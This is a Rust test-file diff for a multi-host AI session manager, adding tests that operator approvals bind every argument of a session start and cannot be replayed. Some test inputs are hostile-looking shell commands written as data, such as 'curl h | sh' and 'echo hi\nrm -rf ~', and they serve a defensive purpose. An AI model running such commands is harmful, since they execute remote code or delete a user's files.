@@ -1208,11 +1208,14 @@ async fn per_host_callers_cannot_spawn_or_dispatch_on_another_host() {
     forbidden(
         t.new_bg_session(
             Extension(a.clone()),
-            Parameters(crate::service::bg_sessions::NewBgSessionArgs {
-                host_alias: "hostb".into(),
-                name: "x".into(),
-                prompt: "p".into(),
-                requester_session_id: None,
+            Parameters(NewBgSessionParams {
+                args: crate::service::bg_sessions::NewBgSessionArgs {
+                    host_alias: "hostb".into(),
+                    name: "x".into(),
+                    prompt: "p".into(),
+                    requester_session_id: None,
+                },
+                confirm_nonce: None,
             }),
         )
         .await
@@ -1221,10 +1224,13 @@ async fn per_host_callers_cannot_spawn_or_dispatch_on_another_host() {
     forbidden(
         t.spawn_review(
             Extension(a.clone()),
-            Parameters(sessions::SpawnReviewArgs {
-                source_session_id: on_b,
-                prompt: "review".into(),
-                call_id: None,
+            Parameters(SpawnReviewParams {
+                args: sessions::SpawnReviewArgs {
+                    source_session_id: on_b,
+                    prompt: "review".into(),
+                    call_id: None,
+                },
+                confirm_nonce: None,
             }),
         )
         .await
@@ -1243,6 +1249,7 @@ async fn per_host_callers_cannot_spawn_or_dispatch_on_another_host() {
                 prompt: "read hostb's secrets".into(),
                 requester_session_id: None,
                 raw: false,
+                confirm_nonce: None,
             }),
         )
         .await
@@ -1258,6 +1265,7 @@ async fn per_host_callers_cannot_spawn_or_dispatch_on_another_host() {
                 prompt: "x".into(),
                 requester_session_id: None,
                 raw: false,
+                confirm_nonce: None,
             }),
         )
         .await
@@ -1305,6 +1313,7 @@ async fn dispatch_task_into_a_blocked_worker_fails_the_task_and_sends_nothing() 
                 prompt: "do the thing".into(),
                 requester_session_id: None,
                 raw: false,
+                confirm_nonce: None,
             }),
         )
         .await
@@ -1336,11 +1345,14 @@ async fn a_background_session_cannot_name_a_requester_on_another_host() {
     forbidden(
         t.new_bg_session(
             Extension(a),
-            Parameters(crate::service::bg_sessions::NewBgSessionArgs {
-                host_alias: "hosta".into(),
-                name: "x".into(),
-                prompt: "p".into(),
-                requester_session_id: Some(on_b),
+            Parameters(NewBgSessionParams {
+                args: crate::service::bg_sessions::NewBgSessionArgs {
+                    host_alias: "hosta".into(),
+                    name: "x".into(),
+                    prompt: "p".into(),
+                    requester_session_id: Some(on_b),
+                },
+                confirm_nonce: None,
             }),
         )
         .await
@@ -1357,11 +1369,14 @@ async fn a_background_session_cannot_name_a_requester_that_does_not_exist() {
     let err = t
         .new_bg_session(
             Extension(Caller::master()),
-            Parameters(crate::service::bg_sessions::NewBgSessionArgs {
-                host_alias: "hosta".into(),
-                name: "x".into(),
-                prompt: "p".into(),
-                requester_session_id: Some(9_999),
+            Parameters(NewBgSessionParams {
+                args: crate::service::bg_sessions::NewBgSessionArgs {
+                    host_alias: "hosta".into(),
+                    name: "x".into(),
+                    prompt: "p".into(),
+                    requester_session_id: Some(9_999),
+                },
+                confirm_nonce: None,
             }),
         )
         .await
@@ -1420,9 +1435,12 @@ async fn per_host_callers_cannot_recreate_or_dismiss_on_another_host() {
     forbidden(
         t.recreate_session(
             Extension(a.clone()),
-            Parameters(sessions::RecreateSessionArgs {
-                session_id: on_b,
-                force: true,
+            Parameters(RecreateSessionParams {
+                args: sessions::RecreateSessionArgs {
+                    session_id: on_b,
+                    force: true,
+                },
+                confirm_nonce: None,
             }),
         )
         .await
@@ -3265,7 +3283,12 @@ fn the_served_definition_budget_stays_bounded() {
     // Hub federation merged onto M9 (main): `list_peer_links` and the
     // federation clauses on the messaging tools. Measured at 71,066 on
     // 2026-09-25 (+301 over M9's 70,765); plus 100.
-    const BUDGET_BYTES: usize = 71_166;
+    // M9.7 review fix: the operator gate covers every start and restart, so
+    // `confirm_nonce` on new_bg_session, spawn_review, dispatch_task,
+    // restore_host_sessions, recreate_session and restart_session (no new
+    // tool, no description change). Measured at 71,558 on 2026-09-25 (+492);
+    // plus 100.
+    const BUDGET_BYTES: usize = 71_658;
     fn definition_bytes(caller: &Caller) -> (usize, usize) {
         let tools: Vec<_> = FleetTools::tool_router_for_doc()
             .list_all()
@@ -4244,10 +4267,13 @@ async fn restore_host_sessions_is_host_scoped_and_dry_run_returns_the_plan() {
     forbidden(
         t.restore_host_sessions(
             Extension(a),
-            Parameters(sessions::RestoreHostSessionsArgs {
-                host_alias: "hostb".into(),
-                dry_run: true,
-                session_ids: None,
+            Parameters(RestoreHostSessionsParams {
+                args: sessions::RestoreHostSessionsArgs {
+                    host_alias: "hostb".into(),
+                    dry_run: true,
+                    session_ids: None,
+                },
+                confirm_nonce: None,
             }),
         )
         .await
@@ -4260,10 +4286,13 @@ async fn restore_host_sessions_is_host_scoped_and_dry_run_returns_the_plan() {
     let r = t
         .restore_host_sessions(
             Extension(Caller::master()),
-            Parameters(sessions::RestoreHostSessionsArgs {
-                host_alias: "hostb".into(),
-                dry_run: true,
-                session_ids: None,
+            Parameters(RestoreHostSessionsParams {
+                args: sessions::RestoreHostSessionsArgs {
+                    host_alias: "hostb".into(),
+                    dry_run: true,
+                    session_ids: None,
+                },
+                confirm_nonce: None,
             }),
         )
         .await
@@ -4336,6 +4365,9 @@ fn one_full_row() -> serde_json::Value {
         suggestions: 1,
         ..Default::default()
     });
+    // With an org, for the same reason: `org_id` is skipped when no org
+    // claims the session.
+    row.org_id = Some(3);
     // Through the constructor, so the derived `needs_attention` is stamped
     // the same way `list_sessions` stamps it — the view is pinned against
     // what the wire actually carries, not against a hand-built row.
@@ -4365,6 +4397,7 @@ fn the_phone_view_is_exactly_the_columns_a_pager_reads() {
             "last_stop_at",
             "last_turn_at",
             "needs_attention",
+            "org_id",
             "pending_input",
             "project_id",
             "safe_kill_state",
@@ -6718,6 +6751,12 @@ fn the_operator_must_confirm_starts_kills_and_every_confirm_tool() {
     for tool in [
         "new_session",
         "new_shell_session",
+        "new_bg_session",
+        "spawn_review",
+        "dispatch_task",
+        "restore_host_sessions",
+        "recreate_session",
+        "restart_session",
         "safe_kill_session",
         "work_link",
         "kill_session",
@@ -6727,7 +6766,12 @@ fn the_operator_must_confirm_starts_kills_and_every_confirm_tool() {
         assert!(guard::operator_must_confirm(true, tool), "{tool}");
         assert!(!guard::operator_must_confirm(false, tool), "{tool}");
     }
-    for tool in ["list_sessions", "send_prompt", "work", "restart_session"] {
+    for tool in [
+        "list_sessions",
+        "send_prompt",
+        "work",
+        "discover_lost_sessions",
+    ] {
         assert!(!guard::operator_must_confirm(true, tool), "{tool}");
     }
     let op = client_caller(
@@ -6919,4 +6963,382 @@ async fn a_hub_with_no_approver_refuses_the_operator_s_start_outright() {
         e.message
     );
     assert!(t.guards.confirms.pending_tools().is_empty());
+}
+
+fn operator() -> Caller {
+    client_caller(
+        crate::service::operator::OPERATOR_CLIENT_NAME,
+        TokenMode::Full,
+    )
+}
+
+fn new_session_params(v: serde_json::Value) -> NewSessionParams {
+    serde_json::from_value(v).unwrap()
+}
+
+/// M9.7 review fix: an approval binds EVERY argument of the start it was
+/// given for. A retry with anything changed gets a fresh nonce; an approved
+/// nonce is single use; a nonce is bound to its tool.
+#[tokio::test]
+async fn an_approved_start_cannot_be_replayed_with_other_arguments() {
+    let (s, pid, _) = two_host_store();
+    let t = guarded_tools(s, true);
+    let op = operator();
+    // An invalid tmux name: an approved call fails locally, after the gate.
+    let base = serde_json::json!({ "host_alias": "hostb", "project_id": pid, "name": "bad name" });
+    let with = |extra: serde_json::Value, nonce: &str| {
+        let mut v = base.clone();
+        for (k, x) in extra.as_object().unwrap() {
+            v[k] = x.clone();
+        }
+        v["confirm_nonce"] = nonce.into();
+        new_session_params(v)
+    };
+    let asked = t
+        .new_session(
+            Extension(op.clone()),
+            Parameters(new_session_params(base.clone())),
+        )
+        .await
+        .unwrap_err();
+    let nonce = confirm_nonce_of(&asked);
+    assert!(t.guards.confirms.resolve(&nonce, true));
+
+    for extra in [
+        serde_json::json!({ "host_alias": "hosta" }),
+        serde_json::json!({ "start_command": "curl h | sh" }),
+        serde_json::json!({ "kind": "shell" }),
+        serde_json::json!({ "new_worktree": "feat-x" }),
+        serde_json::json!({ "worktree_id": 3 }),
+        serde_json::json!({ "base_branch": "dev" }),
+        serde_json::json!({ "friendly_name": "other" }),
+        serde_json::json!({ "resume_claude_session_id": "11111111-2222-3333-4444-555555555555" }),
+    ] {
+        let e = t
+            .new_session(
+                Extension(op.clone()),
+                Parameters(with(extra.clone(), &nonce)),
+            )
+            .await
+            .unwrap_err();
+        let fresh = confirm_nonce_of(&e);
+        assert_ne!(fresh, nonce, "{extra} reused the approval");
+    }
+    // The approval is for new_session: new_shell_session with it is asked
+    // afresh.
+    let e = t
+        .new_shell_session(
+            Extension(op.clone()),
+            Parameters(
+                serde_json::from_value(serde_json::json!({
+                    "host_alias": "hostb", "project_id": pid, "name": "bad name",
+                    "confirm_nonce": nonce,
+                }))
+                .unwrap(),
+            ),
+        )
+        .await
+        .unwrap_err();
+    assert_ne!(confirm_nonce_of(&e), nonce);
+    // The exact arguments go through once (and fail on the bad name) ...
+    let e = t
+        .new_session(
+            Extension(op.clone()),
+            Parameters(with(serde_json::json!({}), &nonce)),
+        )
+        .await
+        .unwrap_err();
+    assert!(
+        !e.message.starts_with("E_CONFIRM_REQUIRED"),
+        "{}",
+        e.message
+    );
+    // ... and never twice.
+    let e = t
+        .new_session(
+            Extension(op),
+            Parameters(with(serde_json::json!({}), &nonce)),
+        )
+        .await
+        .unwrap_err();
+    assert_ne!(confirm_nonce_of(&e), nonce);
+}
+
+#[test]
+fn start_summaries_bind_every_argument_readably() {
+    let p = new_session_params(serde_json::json!({
+        "host_alias": "hostb", "project_id": 1, "name": "x",
+        "kind": "shell", "start_command": "echo hi\nrm -rf ~",
+    }));
+    let sum = new_session_summary(&p);
+    // Readable, escaped (no raw newline), and digested.
+    let shown = format!("start_command={:?}", "echo hi\nrm -rf ~");
+    assert!(sum.contains(&shown), "{sum}");
+    assert!(!sum.contains('\n'), "{sum}");
+    assert!(
+        sum.contains(&guard::content_digest("echo hi\nrm -rf ~")),
+        "{sum}"
+    );
+    assert!(sum.contains("kind=\"shell\""), "{sum}");
+    // A long text shows only its prefix, but its digest covers all of it.
+    let long = "a".repeat(BOUND_TEXT_PREFIX + 10);
+    let b = bound_text(Some(&long));
+    assert!(b.contains('…') && !b.contains(&long), "{b}");
+    assert_ne!(b, bound_text(Some(&format!("{long}b"))));
+    assert_eq!(bound_text(None), "-");
+    // A brief is a digest only.
+    let a = crate::service::work::WorkLinkArgs {
+        action: "start".into(),
+        brief: Some("secret plan".into()),
+        force_cross_org: Some(true),
+        ..Default::default()
+    };
+    let w = work_link_start_summary(&a, &["4:o/r".into()]);
+    assert!(!w.contains("secret plan"), "{w}");
+    assert!(
+        w.contains("force_cross_org=Some(true)") && w.contains("repos=[4:o/r]"),
+        "{w}"
+    );
+}
+
+#[tokio::test]
+async fn an_approved_work_start_is_bound_to_force_cross_org_and_the_rest() {
+    use crate::service::work::WorkLinkArgs;
+    let (s, pid, _) = two_host_store();
+    let t = guarded_tools(s, true);
+    let op = operator();
+    let start = |nonce: Option<String>, f: &dyn Fn(&mut WorkLinkArgs)| {
+        let mut a = WorkLinkArgs {
+            action: "start".into(),
+            item_id: Some(9_999),
+            project_ids: Some(vec![pid]),
+            confirm_nonce: nonce,
+            ..Default::default()
+        };
+        f(&mut a);
+        a
+    };
+    let asked = t
+        .work_link(Extension(op.clone()), Parameters(start(None, &|_| {})))
+        .await
+        .unwrap_err();
+    let nonce = confirm_nonce_of(&asked);
+    assert!(t.guards.confirms.resolve(&nonce, true));
+    let changes: [&dyn Fn(&mut WorkLinkArgs); 6] = [
+        &|a| a.force_cross_org = Some(true),
+        &|a| a.worktree = Some("wt".into()),
+        &|a| a.name = Some("other".into()),
+        &|a| a.with_brief = Some(true),
+        &|a| a.brief = Some("do x".into()),
+        &|a| a.host_alias = Some("hosta".into()),
+    ];
+    for f in changes {
+        let e = t
+            .work_link(
+                Extension(op.clone()),
+                Parameters(start(Some(nonce.clone()), f)),
+            )
+            .await
+            .unwrap_err();
+        assert_ne!(confirm_nonce_of(&e), nonce);
+    }
+    // The approved arguments go through once (each repo then fails on the
+    // unknown item), then never again.
+    let out = t
+        .work_link(
+            Extension(op.clone()),
+            Parameters(start(Some(nonce.clone()), &|_| {})),
+        )
+        .await
+        .expect("approved: the start runs");
+    assert_eq!(result_json(&out)["failed"][0]["code"], "E_NOTFOUND");
+    let e = t
+        .work_link(
+            Extension(op),
+            Parameters(start(Some(nonce.clone()), &|_| {})),
+        )
+        .await
+        .unwrap_err();
+    assert_ne!(confirm_nonce_of(&e), nonce);
+}
+
+/// M9.7 review fix: every other path that starts or restarts a session is
+/// gated for the operator too — before anything runs.
+#[tokio::test]
+async fn the_operator_s_other_starts_and_restarts_are_gated() {
+    let (s, pid, on_b) = two_host_store();
+    let t = guarded_tools(s, true);
+    let op = operator();
+    let e = t
+        .new_bg_session(
+            Extension(op.clone()),
+            Parameters(
+                serde_json::from_value(serde_json::json!({
+                    "host_alias": "hostb", "name": "bg", "prompt": "go"
+                }))
+                .unwrap(),
+            ),
+        )
+        .await
+        .unwrap_err();
+    confirm_nonce_of(&e);
+    let e = t
+        .spawn_review(
+            Extension(op.clone()),
+            Parameters(
+                serde_json::from_value(serde_json::json!({
+                    "source_session_id": on_b, "prompt": "review"
+                }))
+                .unwrap(),
+            ),
+        )
+        .await
+        .unwrap_err();
+    confirm_nonce_of(&e);
+    let e = t
+        .dispatch_task(
+            Extension(op.clone()),
+            Parameters(DispatchTaskParams {
+                worker_session_id: None,
+                new_worker: Some(NewWorkerSpec {
+                    host_alias: "hostb".into(),
+                    project_id: pid,
+                    name: None,
+                }),
+                prompt: "do".into(),
+                requester_session_id: None,
+                raw: false,
+                confirm_nonce: None,
+            }),
+        )
+        .await
+        .unwrap_err();
+    confirm_nonce_of(&e);
+    let e = t
+        .restore_host_sessions(
+            Extension(op.clone()),
+            Parameters(
+                serde_json::from_value(serde_json::json!({ "host_alias": "hostb" })).unwrap(),
+            ),
+        )
+        .await
+        .unwrap_err();
+    confirm_nonce_of(&e);
+    let e = t
+        .recreate_session(
+            Extension(op.clone()),
+            Parameters(serde_json::from_value(serde_json::json!({ "session_id": on_b })).unwrap()),
+        )
+        .await
+        .unwrap_err();
+    confirm_nonce_of(&e);
+    let e = t
+        .restart_session(
+            Extension(op.clone()),
+            Parameters(serde_json::from_value(serde_json::json!({ "session_id": on_b })).unwrap()),
+        )
+        .await
+        .unwrap_err();
+    confirm_nonce_of(&e);
+    // A restore's dry run only reads the plan: not gated.
+    t.restore_host_sessions(
+        Extension(op.clone()),
+        Parameters(
+            serde_json::from_value(serde_json::json!({ "host_alias": "hostb", "dry_run": true }))
+                .unwrap(),
+        ),
+    )
+    .await
+    .expect("a dry run is not gated");
+    // Six starts asked for, nothing more.
+    assert_eq!(t.guards.confirms.pending_tools().len(), 6);
+
+    // Dispatching into an existing worker starts nothing: not gated (the
+    // worker is blocked, so the delivery gate refuses it instead).
+    t.store
+        .lock()
+        .unwrap()
+        .record_notification_hook_for_row(
+            on_b,
+            crate::service::pane_intel::ClaudeStatus::Blocked,
+            None,
+        )
+        .unwrap();
+    let e = t
+        .dispatch_task(
+            Extension(op),
+            Parameters(DispatchTaskParams {
+                worker_session_id: Some(on_b),
+                new_worker: None,
+                prompt: "do".into(),
+                requester_session_id: None,
+                raw: false,
+                confirm_nonce: None,
+            }),
+        )
+        .await
+        .unwrap_err();
+    assert!(
+        !e.message.starts_with("E_CONFIRM_REQUIRED"),
+        "{}",
+        e.message
+    );
+}
+
+/// …and for every caller that is not the operator, nothing changes: the
+/// newly gated tools stay ungated, with `mcp.confirm_destructive` off or on.
+#[tokio::test]
+async fn the_new_operator_gates_change_nothing_for_anyone_else() {
+    let (s, _, _) = two_host_store();
+    let t = guarded_tools(s, true);
+    let callers = [
+        Caller::master(),
+        host_caller("hostb", TokenMode::Full),
+        host_caller("hostb", TokenMode::Readonly),
+        client_caller("phone", TokenMode::Full),
+        client_caller("phone", TokenMode::Readonly),
+    ];
+    let tools = [
+        "new_bg_session",
+        "spawn_review",
+        "dispatch_task",
+        "restore_host_sessions",
+        "recreate_session",
+        "restart_session",
+    ];
+    for toggle in ["false", "true"] {
+        t.store
+            .lock()
+            .unwrap()
+            .set_setting(guard::SETTING_CONFIRM_DESTRUCTIVE, toggle)
+            .unwrap();
+        for c in &callers {
+            assert!(!c.is_operator());
+            for tool in tools {
+                assert!(!guard::needs_confirmation(tool), "{tool}");
+                t.confirm_gate(tool, None, "any", c)
+                    .unwrap_or_else(|e| panic!("{tool} for {}: {}", c.label(), e.message));
+            }
+        }
+    }
+    assert!(t.guards.confirms.pending_tools().is_empty());
+    // At tool level: a phone's dry-run restore and a master's restart of an
+    // unknown session behave as before.
+    t.restore_host_sessions(
+        Extension(client_caller("phone", TokenMode::Full)),
+        Parameters(
+            serde_json::from_value(serde_json::json!({ "host_alias": "hostb", "dry_run": true }))
+                .unwrap(),
+        ),
+    )
+    .await
+    .expect("dry run");
+    let e = t
+        .restart_session(
+            Extension(Caller::master()),
+            Parameters(serde_json::from_value(serde_json::json!({ "session_id": 9_999 })).unwrap()),
+        )
+        .await
+        .unwrap_err();
+    assert!(e.message.starts_with("E_NOTFOUND"), "{}", e.message);
 }
